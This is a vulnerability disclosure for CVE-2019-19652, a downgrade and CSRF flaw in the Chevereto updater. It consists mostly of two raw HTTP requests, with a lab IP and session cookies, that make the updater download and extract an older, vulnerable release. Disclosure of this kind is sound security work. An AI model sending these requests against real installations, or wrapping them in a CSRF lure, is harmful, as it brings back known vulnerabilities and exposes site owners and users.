# CVE-2019-19652
Chevereto downgrade attack - 1.0.0 - 1.1.4 Free, <= 3.13.5 Core. An admin user can instruct the updater script to downgrade to another version instead of upgrade, reintroducing previous flaws. Due to the lack of a CSRF token this attack can also be used in a CSRF attack, meaning an admin user can be tricked into performing this action.

# An admin user can tell the update script to download any version, even old ones

The server will return the full filename of the downloaded file which will then be used in the next request
```
GET /update/?action=download&version=3.13.4 HTTP/1.1
Host: 192.168.0.88
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Referer: http://192.168.0.88/dashboard/settings/external-services
Cookie: PHPSESSID=47s523u1s4m67g0vaheldg4s31; KEEP_LOGIN=I8G%3A65983a8df3bcb482e2571a6e771c89600221f615208d39aee8bf6663b88aef732c7783e202410a7ae4c3ad2205c96baeddb841b912325b359ec79528638807efbff73a017c6d719aa0cab0d6a5814d98a671c17d457479371228c590e215f7e8bc7bfcb820142106%3A1575658473
Upgrade-Insecure-Requests: 1
```


# And then simply extract it over the current version, potentially making it vulnerable to old vulnerabilities

```
GET /update/?action=extract&file=chevereto_3.13.4_3e50e6fa70915cd22849819f.zip HTTP/1.1
Host: 192.168.0.88
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Referer: http://192.168.0.88/dashboard/settings/external-services
Cookie: PHPSESSID=47s523u1s4m67g0vaheldg4s31; KEEP_LOGIN=I8G%3A65983a8df3bcb482e2571a6e771c89600221f615208d39aee8bf6663b88aef732c7783e202410a7ae4c3ad2205c96baeddb841b912325b359ec79528638807efbff73a017c6d719aa0cab0d6a5814d98a671c17d457479371228c590e215f7e8bc7bfcb820142106%3A1575658473
Upgrade-Insecure-Requests: 1
```
